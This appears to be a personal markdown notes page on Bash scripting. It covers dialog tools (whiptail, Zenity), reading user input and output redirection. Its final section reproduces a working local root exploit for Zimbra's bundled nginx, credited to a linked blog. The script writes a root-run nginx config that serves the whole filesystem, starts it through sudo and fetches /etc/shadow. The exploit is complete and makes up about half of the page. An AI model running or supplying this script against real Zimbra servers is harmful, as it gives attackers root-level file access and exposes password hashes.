# S c r i p t i n g

## GUI
- [whiptail](https://www.tutorialspoint.com/unix_commands/whiptail.htm) - Display dialog boxes from shell scripts.
- Zenity
  - [How to display GUI dialogs in bash script using Zenity](https://www.howtoforge.com/how-to-display-gui-dialogs-in-bash-script-using-zenity/)
  - [How to use graphical widgets in bash scripts with zenity](https://linuxconfig.org/how-to-use-graphical-widgets-in-bash-scripts-with-zenity)
  ### Examples
  - [EasyGPG](https://github.com/guelfoweb/easygpg) - Zenity GUI to manage GPG keys.

## Waiting for user input
````powershell
read -p "Write the path: " variableName
read -p "Press [ENTER] when finished..."
````

## Redirecting output
Code
````powershell
sudo apt update > /dev/null 2>&1 

````

## zimbra-nginx-local-root-exploit
- [Source](https://darrenmartyn.ie/2021/10/25/zimbra-nginx-local-root-exploit/)
````
#!/bin/bash
echo "[+] making config"
cat <<EOF >/tmp/nginx.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
server {
    listen 1337;
    root /;
    autoindex on;
}
}
EOF
echo "[+] Launching..."
sudo /opt/zimbra/common/sbin/nginx -c /tmp/nginx.conf
echo "[+] Reading /etc/shadow..."
curl http://localhost:1337/etc/shadow
````
